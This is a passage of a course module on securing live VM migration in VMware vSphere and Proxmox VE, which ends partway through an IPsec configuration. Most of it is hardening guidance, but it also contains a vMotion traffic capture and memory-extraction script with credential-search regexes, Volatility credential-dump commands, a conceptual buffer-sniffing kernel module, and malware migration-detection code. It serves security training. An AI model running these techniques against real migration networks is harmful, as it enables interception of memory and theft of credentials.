# Live Migration Security — Securing VM Mobility

> **Modulo del corso:** Migrazione VMware → Proxmox VE
> **Posizione nel percorso:** Fase 9 — Sicurezza avanzata · Modulo 35 (nuovo)
> **Prerequisiti:** moduli 01-02 (fondamenti VMware e Proxmox), modulo 10 (cluster HA), modulo 12 (sicurezza e compliance), modulo 20 (hypervisor hardening), modulo 22 (network segmentation). Familiarita con: TCP/IP networking, PKI/TLS, IPsec, VLAN tagging, hypervisor memory management, storage protocols (iSCSI, NFS, Ceph), SIEM platforms.
> **Obiettivi di apprendimento.** Al termine del modulo lo studente sara in grado di:
> 1. identificare e classificare le superfici d'attacco specifiche della live migration;
> 2. configurare e verificare encrypted vMotion su VMware vSphere 7/8;
> 3. configurare migrazione live sicura su Proxmox VE con rete dedicata e tunneling;
> 4. comprendere e difendersi da attacchi di memory inspection durante il trasferimento;
> 5. implementare protezioni di rete (IPsec, WireGuard, MACsec, microsegmentation);
> 6. proteggere storage migration e verificare integrita post-migrazione;
> 7. gestire migrazione cross-cluster e cross-site con sicurezza end-to-end;
> 8. soddisfare requisiti di compliance (PCI-DSS, HIPAA, SOC 2, GDPR) relativi alla mobilita VM;
> 9. implementare monitoring e detection per migrazioni non autorizzate;
> 10. eseguire lab exercises completi per hardening e testing della sicurezza migrazione.
> **Tempo stimato:** lettura 150-200 min · implementazione lab 3-5 giorni · review trimestrale
> **Livello:** expert (Dreyfus 5); offensive security awareness required
> **Ultimo aggiornamento:** 2026-05-07
> **Versioni di riferimento:** VMware vSphere 7.0 U3 / 8.0 U3; Proxmox VE 8.x; WireGuard 1.0+; strongSwan 5.9+; Ceph Reef/Squid; Linux kernel 6.x.

---

## Mappa concettuale

```
+======================================================================+
|         LIVE MIGRATION SECURITY: Layered Defense Model                |
+======================================================================+
|                                                                      |
|   LAYER 1: MIGRATION NETWORK ISOLATION                               |
|     Dedicated NICs/VLANs, no shared production path                  |
|     802.1X port auth, MACsec L2 encryption                          |
|                                                                      |
|   LAYER 2: TRANSPORT ENCRYPTION                                      |
|     vMotion encryption (vSphere), SSH tunneling (Proxmox)            |
|     IPsec/WireGuard for cross-site, TLS 1.3 minimum                 |
|                                                                      |
|   LAYER 3: MEMORY PROTECTION                                         |
|     AMD SEV/SEV-SNP, Intel TDX/TME-MK                               |
|     No cleartext memory pages in transit                             |
|                                                                      |
|   LAYER 4: STORAGE SECURITY                                          |
|     Encrypted backends (LUKS, ZFS, vSAN), integrity checksums        |
|     Data remanence controls on source                                |
|                                                                      |
|   LAYER 5: AUTHENTICATION & AUTHORIZATION                            |
|     Mutual TLS, certificate pinning, RBAC for migration ops         |
|     API token scoping, least privilege                               |
|                                                                      |
|   LAYER 6: MONITORING & DETECTION                                    |
|     SIEM integration, Sigma rules, anomaly detection                 |
|     Unauthorized migration alerting                                  |
|                                                                      |
|   LAYER 7: COMPLIANCE & AUDIT                                        |
|     PCI-DSS segmentation, HIPAA PHI controls                         |
|     SOC 2 evidence, GDPR residency enforcement                      |
|                                                                      |
+======================================================================+
```

---

## 1. Live Migration Attack Surface

### 1.1 Migration Protocol Analysis

Live migration transfers the complete runtime state of a virtual machine — CPU registers, RAM contents, device state, network connections — from one physical host to another while the VM remains operational. This creates a fundamentally different attack surface than static VM operation.

**vMotion Protocol (VMware):**

The vMotion protocol operates in distinct phases:

1. **Pre-copy phase:** Source host begins copying memory pages to destination while VM continues running on source.
2. **Iterative copy:** Dirty pages (modified since last iteration) are re-sent. This continues until the dirty page rate falls below the transfer rate.
3. **Stop-and-copy:** VM is briefly stunned, remaining dirty pages and CPU state transferred.
4. **Activation:** VM resumes on destination host.

The default vMotion protocol (pre-vSphere 6.5) transmits all data in cleartext over TCP port 8000. This includes:

- Complete RAM contents (potentially containing encryption keys, credentials, session tokens)
- CPU register state (including debug registers, MSRs)
- Device state (virtual NIC buffers, disk controller state)
- NVRAM contents (UEFI variables, Secure Boot state)

**Proxmox Migration Protocol:**

Proxmox VE uses QEMU's migration protocol, tunneled through SSH by default:

1. **Setup:** Source node establishes SSH connection to destination.
2. **RAM transfer:** QEMU migration stream (custom binary protocol) flows through SSH tunnel.
3. **Device state:** Virtual hardware state serialized and transferred.
4. **Switchover:** VM activates on destination, source releases resources.

The SSH tunnel provides encryption, but the underlying QEMU migration stream itself is unencrypted binary data — if the SSH tunnel is bypassed or a non-tunneled migration is configured, data is exposed.

### 1.2 Data-in-Transit Exposure

The fundamental security problem: during live migration, the entire VM state traverses the network. For a VM with 64GB RAM, that is 64GB of potentially sensitive data crossing network infrastructure.

**What is exposed during transit:**

| Data Category | Risk Level | Examples |
|---|---|---|
| Application memory | CRITICAL | Database query results, decrypted data, session tokens |
| Kernel memory | CRITICAL | Credential caches, encryption keys, process tables |
| TLS session keys | CRITICAL | Private keys loaded in memory, TLS session tickets |
| Password hashes | HIGH | /etc/shadow loaded in page cache, AD credential cache |
| Health data (PHI) | HIGH | Patient records in application memory |
| PCI card data | HIGH | CHD in payment application memory buffers |
| Disk cache | MEDIUM | Recently accessed file contents in page cache |
| Network buffers | MEDIUM | In-flight packet contents, connection state |

### 1.3 Man-in-the-Middle on Migration Traffic

**Attack scenario: Passive interception of unencrypted vMotion**

An attacker with access to the migration network (via compromised switch, SPAN port, ARP poisoning, or physical tap) can capture the complete VM memory contents:

```
ATTACKER POSITION:
                                                  
  [Source ESXi] ----vMotion (TCP 8000)----> [Destination ESXi]
                         |
                    [SPAN port / TAP]
                         |
                    [Attacker captures
                     full RAM contents]
```

**Attack scenario: Active MITM with traffic modification**

A more sophisticated attacker can not only capture but modify the migration stream:

1. ARP spoof or BGP hijack to redirect migration traffic through attacker's system.
2. Capture the complete memory image.
3. Modify memory contents in transit (inject backdoor, modify security policies).
4. Forward modified stream to destination.
5. VM resumes on destination with attacker-modified memory state.

This is particularly devastating because:
- Integrity checks on the migration stream are minimal (designed for reliability, not security).
- Memory modifications take effect immediately upon VM resumption.
- No audit trail — the VM appears to have migrated normally.
- Traditional host-based IDS inside the VM cannot detect external memory modification.

### 1.4 Network Requirements and Dedicated Migration Networks

**Why dedicated migration networks are non-negotiable:**

1. **Bandwidth isolation:** Migration traffic is bursty and can saturate links. If shared with production, legitimate traffic suffers and migration extends, increasing the attack window.

2. **Security boundary:** Migration traffic contains the most sensitive possible data — complete memory contents. It must never traverse shared infrastructure where unauthorized systems could observe it.

3. **Blast radius containment:** If the production network is compromised, the migration network remains isolated. The attacker cannot passively observe migrations.

4. **Compliance requirement:** PCI-DSS explicitly requires network segmentation. HIPAA requires transmission security for PHI. A shared migration/production network likely violates both.

**Minimum network architecture:**

```
+-----------------------------------------------------------+
|                    PHYSICAL TOPOLOGY                        |
+-----------------------------------------------------------+
|                                                           |
|  [ESXi/PVE Host A]          [ESXi/PVE Host B]            |
|    vmnic0 — Production VLAN 100                           |
|    vmnic1 — Management  VLAN 10                           |
|    vmnic2 — vMotion/Migration VLAN 200 (DEDICATED)        |
|    vmnic3 — Storage VLAN 300                              |
|                                                           |
|  VLAN 200 (Migration):                                    |
|    - Isolated L2 domain                                   |
|    - No default gateway (non-routable)                    |
|    - Jumbo frames (MTU 9000) for performance              |
|    - No DHCP — static IPs only                            |
|    - ACLs: only hypervisor management IPs permitted       |
|    - 802.1X or MACsec on switch ports                     |
|                                                           |
+-----------------------------------------------------------+
```

**Critical design principles:**

- Migration VLAN must be non-routable (no L3 gateway assigned on the switch).
- Switch ports in migration VLAN should have port-security limiting MAC addresses to known hypervisor interfaces.
- SPAN/mirror ports must NOT include the migration VLAN.
- Physical cabling should be distinct where feasible (separate switch or dedicated ports on separate line cards).

---

## 2. VMware vMotion Security

### 2.1 vMotion Encryption Modes

VMware introduced vMotion encryption in vSphere 6.5 and enhanced it significantly in 7.0+. Three modes exist:

| Mode | Behavior | Performance Impact | Security |
|---|---|---|---|
| **Disabled** | All vMotion traffic in cleartext | None | NONE — full exposure |
| **Opportunistic** | Encrypt if both hosts support it; fall back to cleartext | ~5-10% | Vulnerable to downgrade |
| **Required** | Encrypt always; migration fails if encryption unavailable | ~5-15% | Strong — no fallback |

**vSphere 7.0+ encryption implementation:**

- Uses AES-256-GCM for the data stream.
- Per-migration ephemeral keys derived via ECDH key exchange.
- Keys exchanged through vCenter (encrypted channel, vCenter acts as trusted intermediary).
- The key exchange occurs over the vCenter management connection (TLS-protected), then data encryption happens directly between hosts.

### 2.2 Configuring Encrypted vMotion

**Per-VM encryption policy (vSphere 7.0+):**

```
# PowerCLI: Set vMotion encryption to Required for all VMs in a cluster
$cluster = Get-Cluster -Name "Production-Cluster"
$vms = Get-VM -Location $cluster

foreach ($vm in $vms) {
    $spec = New-Object VMware.Vim.VirtualMachineConfigSpec
    $spec.MigrateEncryption = "required"
    $vm.ExtensionData.ReconfigVM($spec)
    Write-Host "Set migration encryption to REQUIRED on: $($vm.Name)"
}
```

**Cluster-wide encryption enforcement via vCenter policy:**

```
# PowerCLI: Verify encryption settings across all VMs
Get-VM | Select-Object Name, @{
    N='MigrateEncryption';
    E={$_.ExtensionData.Config.MigrateEncryption}
} | Where-Object { $_.MigrateEncryption -ne 'required' } |
Format-Table -AutoSize
```

**vSphere 8.0 enhancement — VM-level encryption with vTPM:**

VMs with virtual TPM (vTPM) automatically enforce encrypted vMotion. The vTPM state (containing keys, measurements, sealed secrets) cannot be transmitted in cleartext:

```
# Verify vTPM presence forces encrypted migration
Get-VM -Name "Sensitive-VM" | Get-HardDisk | Where-Object {
    $_.ExtensionData.GetType().Name -eq "VirtualTPM"
}
# If vTPM present, migration encryption is automatically required
```

### 2.3 vMotion Network Isolation

**Dedicated VMkernel adapter configuration:**

```
# PowerCLI: Create dedicated vMotion VMkernel adapter
$vmhost = Get-VMHost -Name "esxi01.lab.local"
$vswitch = Get-VirtualSwitch -VMHost $vmhost -Name "vSwitch-Migration"

# Create port group on dedicated vSwitch
New-VirtualPortGroup -VirtualSwitch $vswitch `
    -Name "vMotion-PG" -VLanId 200

# Create VMkernel adapter with vMotion enabled
New-VMHostNetworkAdapter -VMHost $vmhost `
    -PortGroup "vMotion-PG" `
    -VirtualSwitch $vswitch `
    -IP "10.200.0.11" `
    -SubnetMask "255.255.255.0" `
    -VMotionEnabled $true `
    -ManagementTrafficEnabled $false `
    -FaultToleranceLoggingEnabled $false `
    -VsanTrafficEnabled $false
```

**Distributed switch with NIOC (Network I/O Control):**

```
# PowerCLI: Configure NIOC for vMotion traffic shaping
$dvs = Get-VDSwitch -Name "DSwitch-Prod"

# Get the vMotion system traffic type
$vMotionTraffic = Get-VDTrafficShapingPolicy -VDSwitch $dvs `
    -Direction "Out" | Where-Object { $_.TrafficType -eq "vmotion" }

# Reserve bandwidth and set limits
Set-VDTrafficShapingPolicy -Policy $vMotionTraffic `
    -SharesLevel "High" `
    -ReservationMbps 5000 `
    -BurstSizeMb 512
```

**NIOC resource allocation table for migration traffic:**

| Traffic Type | Shares | Reservation | Limit |
|---|---|---|---|
| vMotion | High (100) | 5 Gbps | None |
| Management | Normal (50) | 1 Gbps | None |
| VM Traffic | Normal (50) | Remaining | None |
| vSAN | High (100) | 5 Gbps | None |
| NFS | Low (25) | 1 Gbps | None |

### 2.4 Attack: Intercepting Unencrypted vMotion Traffic

> **WARNING:** The following technique is for authorized security testing only. Unauthorized interception of network traffic is illegal in most jurisdictions.

**Scenario:** An attacker has gained access to a SPAN port or has ARP-poisoned the migration network. vMotion encryption is set to "Disabled" or "Opportunistic" (with a downgrade attack in play).

**Step 1: Capture vMotion traffic**

```bash
# On attacker's system connected to migration network SPAN
# vMotion uses TCP port 8000 by default
tcpdump -i eth0 -nn -w vmotion_capture.pcap \
    'tcp port 8000 and host 10.200.0.11'

# For higher performance capture (avoids packet drops)
tshark -i eth0 -f 'tcp port 8000' -b filesize:1000000 \
    -w /captures/vmotion_
```

**Step 2: Extract memory contents from capture**

```python
#!/usr/bin/env python3
"""
vMotion memory extraction from packet capture.
FOR AUTHORIZED SECURITY TESTING ONLY.
"""
import struct
from scapy.all import rdpcap, TCP, Raw

def extract_vmotion_memory(pcap_file, output_file):
    """
    Extract raw memory pages from unencrypted vMotion capture.
    vMotion protocol sends memory pages with headers indicating
    guest physical address and page size.
    """
    packets = rdpcap(pcap_file)
    memory_data = bytearray()
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            if pkt[TCP].dport == 8000 or pkt[TCP].sport == 8000:
                payload = bytes(pkt[Raw].load)
                # vMotion data stream — accumulate payload
                memory_data.extend(payload)
    
    with open(output_file, 'wb') as f:
        f.write(memory_data)
    
    print(f"Extracted {len(memory_data)} bytes of memory data")
    return memory_data

def search_credentials(memory_dump_file):
    """Search extracted memory for common credential patterns."""
    import re
    
    with open(memory_dump_file, 'rb') as f:
        data = f.read()
    
    # Search for common patterns
    patterns = {
        'HTTP Basic Auth': rb'Authorization: Basic [A-Za-z0-9+/=]+',
        'Private Key': rb'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        'AWS Access Key': rb'AKIA[0-9A-Z]{16}',
        'Password field': rb'password["\s:=]+[^\s"]{4,64}',
        'Session token': rb'session[_-]?(?:id|token)["\s:=]+[a-zA-Z0-9_-]{16,}',
        'Shadow hash': rb'\$[0-9a-z]\$[^\s:]+\$[a-zA-Z0-9./+]+',
    }
    
    findings = {}
    for name, pattern in patterns.items():
        matches = re.findall(pattern, data, re.IGNORECASE)
        if matches:
            findings[name] = matches[:5]  # Limit output
    
    return findings

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    mem_file = "extracted_memory.bin"
    extract_vmotion_memory(sys.argv[1], mem_file)
    
    findings = search_credentials(mem_file)
    for category, matches in findings.items():
        print(f"\n[!] {category}: {len(matches)} match(es)")
        for m in matches:
            print(f"    {m[:80]}")
```

**Step 3: Memory forensics with Volatility on captured data**

```bash
# Use Volatility 3 for structured memory analysis
# First, identify the memory profile
vol3 -f extracted_memory.bin banners.Banners

# Extract password hashes
vol3 -f extracted_memory.bin windows.hashdump.Hashdump

# List network connections (captures in-transit secrets)
vol3 -f extracted_memory.bin windows.netscan.NetScan

# Extract cached credentials
vol3 -f extracted_memory.bin windows.cachedump.Cachedump

# For Linux guests
vol3 -f extracted_memory.bin linux.bash.Bash  # Command history in memory
vol3 -f extracted_memory.bin linux.proc.Maps  # Process memory maps
```

**Defensive verification — confirm encryption is active:**

```bash
# On ESXi host during active migration, verify encryption
esxcli vsan debug vmotion list  # Shows active migrations
tcpdump-uw -i vmk2 -c 100 -w /tmp/migration_sample.pcap 'tcp port 8000'

# Analyze: encrypted vMotion shows high-entropy payload
# (no readable strings, uniform byte distribution)
python3 -c "
import sys
with open('/tmp/migration_sample.pcap', 'rb') as f:
    data = f.read()
# Shannon entropy calculation
from collections import Counter
import math
freq = Counter(data)
total = len(data)
entropy = -sum((c/total) * math.log2(c/total) for c in freq.values())
print(f'Entropy: {entropy:.2f} bits/byte')
print('Expected: >7.9 for encrypted, <6.0 for cleartext with structure')
"
```

---

## 3. Proxmox Live Migration Security

### 3.1 Migration Protocol — SSH Tunneling

Proxmox VE uses SSH tunneling as the default transport for live migration. The migration flow:

```
[Source Node]                              [Destination Node]
     |                                            |
     |-- SSH connection (port 22) --------------->|
     |   (RSA/ED25519 host keys, mutual auth)     |
     |                                            |
     |-- QEMU migration stream inside SSH ------->|
     |   (RAM pages, device state, dirty bitmap)  |
     |                                            |
     |-- Post-migration cleanup ----------------->|
     |   (Remove source VM, update cluster state) |
```

**Key security properties of default Proxmox migration:**

1. **Authentication:** SSH host key verification between cluster nodes.
2. **Encryption:** AES-256 (or ChaCha20-Poly1305) via SSH cipher negotiation.
3. **Integrity:** SSH MAC (HMAC-SHA2-256 or Poly1305) on every packet.
4. **No cleartext fallback:** If SSH connection fails, migration fails (no degradation).

**Cluster authentication (`/etc/pve/`):**

Proxmox cluster nodes authenticate via the cluster's internal PKI:

```bash
# View cluster certificate authority
cat /etc/pve/pve-root-ca.pem

# Each node has its own certificate signed by cluster CA
openssl x509 -in /etc/pve/nodes/$(hostname)/pve-ssl.pem \
    -noout -subject -issuer -dates

# Cluster communication uses pmxcfs (Proxmox Cluster File System)
# which replicates /etc/pve/ across nodes using corosync
systemctl status pve-cluster
```

### 3.2 Migration Network Configuration

**Dedicated migration interface setup:**

```bash
# /etc/network/interfaces on each Proxmox node
# Dedicated migration interface on separate NIC/VLAN

auto ens1f1
iface ens1f1 inet manual

auto vmbr1
iface vmbr1 inet static
    address 10.200.0.11/24
    bridge-ports ens1f1
    bridge-stp off
    bridge-fd 0
    # No gateway — non-routable migration network
    # MTU 9000 for jumbo frames
    mtu 9000
    # Description: MIGRATION ONLY - VLAN 200
```

**Configure Proxmox to use dedicated migration network:**

```bash
# /etc/pve/datacenter.cfg
# Set migration network explicitly
migration: secure,network=10.200.0.0/24

# Alternative: per-node migration address in node config
# /etc/pve/nodes/pve01/config
# migration_address: 10.200.0.11
```

**Migration configuration options in `/etc/pve/datacenter.cfg`:**

```ini
# Migration type: secure (SSH tunnel) or insecure (direct TCP)
# ALWAYS use "secure" in production
migration: secure

# Migration network (dedicated subnet)
migration: secure,network=10.200.0.0/24

# Migration bandwidth limit (MB/s) — prevents saturation
migration_bandwidth: 0
# 0 = unlimited; set to e.g., 8000 for 8 GB/s limit on 100G links
```

> **CRITICAL:** Never set `migration: insecure` in production. The "insecure" mode uses direct TCP without SSH tunneling, transmitting VM memory in cleartext. It exists only for legacy compatibility and debugging.

### 3.3 Verifying Migration Security

```bash
# During an active migration, verify SSH tunnel is in use
# On the source node:
ss -tnp | grep -E '(qemu|ssh)' | grep 10.200.0

# Expected output showing SSH tunnel:
# ESTAB  0  0  10.200.0.11:44231  10.200.0.12:22  users:(("ssh",pid=12345,fd=3))

# Verify no direct QEMU migration ports are exposed
ss -tlnp | grep -E ':(8000|8002|4915[0-9])'
# Should show NOTHING if using secure (tunneled) migration

# Check migration encryption in transit
tcpdump -i vmbr1 -nn -c 20 'tcp port 22 and host 10.200.0.12' -X 2>/dev/null | head -40
# SSH traffic should show encrypted payload (high entropy)
```

### 3.4 Ceph/DRBD Replication Security During Storage Migration

When VMs use shared storage (Ceph, NFS, GlusterFS), only memory and device state need migration. But when storage is local (LVM, ZFS local), storage contents must also be migrated.

**Ceph cluster communication security:**

```ini
# /etc/ceph/ceph.conf — require encrypted messenger v2
[global]
    ms_cluster_mode = secure
    ms_service_mode = secure
    ms_client_mode = secure
    ms_mon_cluster_mode = secure
    ms_mon_service_mode = secure
    ms_mon_client_mode = secure
    
    # CephX authentication (mandatory)
    auth_cluster_required = cephx
    auth_service_required = cephx
    auth_client_required = cephx
    
    # Messenger v2 with encryption
    ms_type = async+msgr2
    
    # Dedicated cluster network for replication
    cluster_network = 10.210.0.0/24
    public_network = 10.200.0.0/24
```

**DRBD security for replicated storage:**

```bash
# /etc/drbd.d/global_common.conf
global {
    usage-count no;
}

common {
    net {
        # Require TLS for all DRBD connections
        # DRBD 9.1+ supports TLS natively
        transport-type rdma;  # Or tcp
        
        # Authentication between peers
        cram-hmac-alg sha256;
        shared-secret "REPLACE_WITH_STRONG_SECRET_FROM_VAULT";
        
        # Peer verification
        verify-alg sha256;
    }
}
```

### 3.5 Cluster Communication Security (`/etc/pve/`)

The `/etc/pve/` filesystem is the heart of Proxmox cluster state — it contains certificates, VM configs, user credentials, and cluster secrets. It is replicated via corosync + pmxcfs.

**Corosync encryption:**

```bash
# /etc/pve/corosync.conf
totem {
    version: 2
    cluster_name: production
    secauth: on
    
    # Corosync 3.x crypto configuration
    crypto_cipher: aes256
    crypto_hash: sha256
    
    interface {
        ringnumber: 0
        bindnetaddr: 10.10.0.0
        mcastport: 5405
    }
}

# Verify corosync key exists and is protected
ls -la /etc/corosync/authkey
# -r-------- 1 root root 128 ... /etc/corosync/authkey
```

**Hardening `/etc/pve/` access:**

```bash
# Verify pmxcfs mount permissions
mount | grep pve
# Should show: /etc/pve type fuse (rw,nosuid,nodev,noexec,relatime)

# Ensure only root and www-data can access sensitive files
ls -la /etc/pve/priv/
# Sensitive files: authkey.key, pve-root-ca.key, shadow entries

# Monitor access to cluster secrets
auditctl -w /etc/pve/priv/ -p rwa -k pve_secrets
auditctl -w /etc/pve/authkey.pub -p r -k pve_authkey_read
```

---

## 4. Memory Inspection Attacks During Migration

### 4.1 Cold Boot Attacks on Migration Buffers

During live migration, memory pages are staged in kernel buffers on both source and destination hosts before and after transfer. These buffers are attractive targets:

**Attack vector: Destination host buffer inspection**

On the destination hypervisor, incoming memory pages are written to pre-allocated buffers before being mapped into the VM's address space. A malicious hypervisor admin or compromised management plane could:

1. Pause the migration at the buffer stage.
2. Read buffer contents before they are mapped to the destination VM.
3. Resume migration — the VM continues normally, unaware of the interception.

```c
/*
 * Conceptual: How memory pages flow during QEMU migration
 * (simplified from QEMU source migration/ram.c)
 * 
 * Source side:
 *   - Walks guest RAM, identifies dirty pages
 *   - Serializes page content into migration stream
 *   
 * Destination side:
 *   - Allocates page-aligned buffers
 *   - Receives page data into buffers
 *   - Maps buffers into guest physical address space
 *
 * ATTACK WINDOW: Between receive into buffer and map to guest
 */

// Attacker kernel module on compromised destination (CONCEPTUAL)
// This demonstrates the RISK, not a usable exploit
static int sniff_migration_buffers(void) {
    struct task_struct *qemu_task;
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    
    // Find QEMU migration process
    for_each_process(qemu_task) {
        if (strstr(qemu_task->comm, "qemu") && 
            is_migration_target(qemu_task)) {
            mm = qemu_task->mm;
            // Walk VMAs looking for migration receive buffers
            for (vma = mm->mmap; vma; vma = vma->vm_next) {
                if (is_migration_buffer(vma)) {
                    // Buffer contains cleartext guest RAM pages
                    dump_vma_contents(vma, "/tmp/captured_pages");
                }
            }
        }
    }
    return 0;
}
```

### 4.2 Page-Level Memory Extraction Techniques

**Pre-copy phase exploitation:**

During the iterative pre-copy phase, the same memory page may be transferred multiple times (each time it is dirtied). An attacker observing the stream can:

1. **Identify hot pages:** Pages sent repeatedly contain frequently-written data (often security-critical: session states, key material being rotated).
2. **Differential analysis:** Compare successive versions of the same page to identify what changed (e.g., a key rotation reveals both old and new keys).
3. **Page table reconstruction:** Guest physical address headers in the stream allow reconstruction of the VM's memory layout.

```python
#!/usr/bin/env python3
"""
Differential memory page analysis from migration stream.
Identifies pages sent multiple times and highlights changes.
FOR AUTHORIZED TESTING ONLY.
"""
import hashlib
from collections import defaultdict

PAGE_SIZE = 4096

def analyze_migration_pages(raw_stream_file):
    """
    Parse raw migration stream for repeated page transfers.
    QEMU migration format includes GPA (Guest Physical Address) headers.
    """
    pages_by_gpa = defaultdict(list)
    
    with open(raw_stream_file, 'rb') as f:
        # Simplified: real parsing requires QEMU migration format knowledge
        # Each page block: [8-byte GPA header][4096-byte page data]
        while True:
            header = f.read(8)
            if len(header) < 8:
                break
            gpa = int.from_bytes(header, 'little')
            page_data = f.read(PAGE_SIZE)
            if len(page_data) < PAGE_SIZE:
                break
            
            page_hash = hashlib.sha256(page_data).hexdigest()
            pages_by_gpa[gpa].append({
                'hash': page_hash,
                'data': page_data
            })
    
    # Find pages transferred multiple times (hot/dirty pages)
    hot_pages = {gpa: versions for gpa, versions in pages_by_gpa.items()
                 if len(versions) > 1}
    
    print(f"Total unique GPAs transferred: {len(pages_by_gpa)}")
    print(f"Hot pages (multiple transfers): {len(hot_pages)}")
    
    # Differential analysis on hot pages
    for gpa, versions in list(hot_pages.items())[:10]:
        if versions[0]['hash'] != versions[-1]['hash']:
            print(f"\n[!] GPA 0x{gpa:016x} changed across {len(versions)} transfers")
            # Show byte-level diff of first and last version
            diff_offsets = []
            for i in range(PAGE_SIZE):
                if versions[0]['data'][i] != versions[-1]['data'][i]:
                    diff_offsets.append(i)
            print(f"    Changed bytes: {len(diff_offsets)} at offsets: {diff_offsets[:20]}")

if __name__ == "__main__":
    import sys
    analyze_migration_pages(sys.argv[1])
```

### 4.3 Migration-Aware Malware

Sophisticated malware can detect when it is being live-migrated and adjust behavior:

**Detection techniques used by malware:**

1. **Timing analysis:** Migration causes measurable performance degradation (pages being copied cause memory access latency spikes).
2. **Hardware fingerprint change:** Post-migration, CPU model string, NUMA topology, or device serial numbers may differ.
3. **Network latency shift:** Network RTT to external services changes when VM moves between sites.
4. **CPUID instruction variations:** Different physical CPUs expose different feature bits.

```c
/*
 * Migration detection heuristic (conceptual malware technique)
 * Malware uses this to:
 *   - Activate: Begin exfiltration during migration (memory exposed)
 *   - Deactivate: Stop malicious activity if migrated to analysis host
 */

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <x86intrin.h>

// Detect migration via memory access timing anomaly
int detect_migration_timing(void) {
    volatile char *buffer = malloc(4096 * 1024); // 4MB buffer
    uint64_t baseline_cycles, current_cycles;
    int anomaly_count = 0;
    
    // Establish baseline: time sequential page access
    uint64_t start = __rdtsc();
    for (int i = 0; i < 1024; i++) {
        buffer[i * 4096] = 'A'; // Touch each page
    }
    baseline_cycles = __rdtsc() - start;
    
    // Monitor for anomalies (migration causes page faults as
    // pages are marked dirty and copied, causing latency spikes)
    while (1) {
        start = __rdtsc();
        for (int i = 0; i < 1024; i++) {
            buffer[i * 4096] = 'B';
        }
        current_cycles = __rdtsc() - start;
        
        // During migration, dirty page tracking causes 3-10x slowdown
        if (current_cycles > baseline_cycles * 3) {
            anomaly_count++;
            if (anomaly_count > 5) {
                // High confidence: migration in progress
                return 1;
            }
        } else {
            anomaly_count = 0;
        }
        
        usleep(10000); // 10ms polling
    }
    free((void*)buffer);
    return 0;
}

// Detect migration via CPUID change
int detect_migration_cpuid(void) {
    unsigned int eax, ebx, ecx, edx;
    static char initial_brand[49] = {0};
    char current_brand[49] = {0};
    
    // Get CPU brand string (CPUID leaves 0x80000002-4)
    __cpuid(0x80000002, eax, ebx, ecx, edx);
    memcpy(current_brand, &eax, 4);
    memcpy(current_brand+4, &ebx, 4);
    memcpy(current_brand+8, &ecx, 4);
    memcpy(current_brand+12, &edx, 4);
    // ... continue for 0x80000003, 0x80000004
    
    if (initial_brand[0] == 0) {
        strcpy(initial_brand, current_brand);
    } else if (strcmp(initial_brand, current_brand) != 0) {
        // CPU brand changed — migration occurred
        return 1;
    }
    return 0;
}
```

**Malware behavior during migration:**

| Behavior | Purpose | Mitigation |
|---|---|---|
| Activate keylogger during migration | Memory contents captured include keylogger buffers — increases harvest | Memory encryption (SEV) |
| Flush credentials to disk pre-migration | Disk may lag behind RAM transfer, leaving credentials on source | Encrypted storage, secure wipe |
| Self-destruct if migrated to sandbox | Evade analysis environments | Consistent hardware abstraction (EVC) |
| Spike dirty pages to extend migration | Longer migration = longer exposure window | Migration timeout limits |

### 4.4 Defenses: Hardware Memory Encryption

**AMD SEV (Secure Encrypted Virtualization):**

AMD SEV encrypts VM memory with a per-VM key managed by a dedicated security processor (PSP/ASP). Even during migration, memory pages remain encrypted.

```bash
# Verify AMD SEV support on Proxmox host
dmesg | grep -i sev
# Expected: "SEV supported: yes" / "SEV-ES supported: yes" / "SEV-SNP supported: yes"

# Check kernel support
cat /sys/module/kvm_amd/parameters/sev
# Expected: Y

# QEMU command line for SEV-enabled VM
qemu-system-x86_64 \
    -machine q35,confidential-guest-support=sev0 \
    -object sev-guest,id=sev0,cbitpos=47,reduced-phys-bits=1,policy=0x5 \
    -m 4096 \
    ...

# For SEV-SNP (strongest, includes attestation):
qemu-system-x86_64 \
    -machine q35,confidential-guest-support=sev-snp0 \
    -object sev-snp-guest,id=sev-snp0,cbitpos=51,reduced-phys-bits=1 \
    ...
```

**SEV migration with encrypted pages:**

With SEV enabled, the migration protocol wraps pages in a transport encryption layer using keys negotiated between the PSP on source and destination:

1. Source PSP exports page encryption keys (wrapped with transport key).
2. Transport key is established via Diffie-Hellman between PSPs.
3. Pages are transferred still encrypted — intermediaries see only ciphertext.
4. Destination PSP imports keys and re-encrypts pages with local VM key.

```bash
# Proxmox: Enable SEV for a VM (requires OVMF firmware)
qm set 100 --cpu host,flags=+sev
qm set 100 --bios ovmf
qm set 100 --machine q35

# Verify SEV is active for running VM
cat /sys/kernel/debug/kvm/*/stats | grep sev
```

**Intel TDX (Trust Domain Extensions):**

Intel TDX provides similar protections for Intel platforms:

```bash
# Check TDX availability
dmesg | grep -i tdx
cat /sys/firmware/tdx/tdx_module_version

# TDX-enabled VM configuration (QEMU 8.0+)
qemu-system-x86_64 \
    -machine q35,confidential-guest-support=tdx0 \
    -object tdx-guest,id=tdx0 \
    -m 4096 \
    ...
```

**Intel TME-MK (Total Memory Encryption - Multi-Key):**

For defense-in-depth even without SEV/TDX VM awareness:

```bash
# TME encrypts all system memory with hardware-managed keys
# Check TME availability
cpuid | grep -i "Total Memory Encryption"
rdmsr 0x982  # IA32_TME_CAPABILITY
rdmsr 0x981  # IA32_TME_ACTIVATE

# TME-MK allows per-VM keys at the hardware level
# Managed by the hypervisor, transparent to guests
```

---

## 5. Network-Level Protections

### 5.1 IPsec Tunnels for Migration Traffic

When migration must traverse L3 networks (cross-site, cross-subnet), IPsec provides authenticated encryption at the network layer.

**strongSwan IPsec configuration for migration traffic:**

```bash
# /etc/swanctl/swanctl.conf on each Proxmox node
connections {
    migration-tunnel {
        version = 2
        local_addrs = 10.200.0.11
        remote_addrs = 10.200.0.12
        
        local {
            auth = pubkey
            certs = node01-migration.pem
            id = "CN=pve01.migration.local"
        }
        
        remote {
            auth = pubkey
            certs = node02-migration.pem
            id = "CN=pve02.migration.local"
        }
        
        children {
            migration-traffic {
                local_ts = 10.200.0.11/32
                remote_ts = 10.200.0.12/32
                
                # ESP with AES-256-GCM (authenticated encryption)
                esp_proposals = aes256gcm128-x25519
                
                # Rekey every 1 hour or 100GB (whichever first)
                rekey_time = 3600
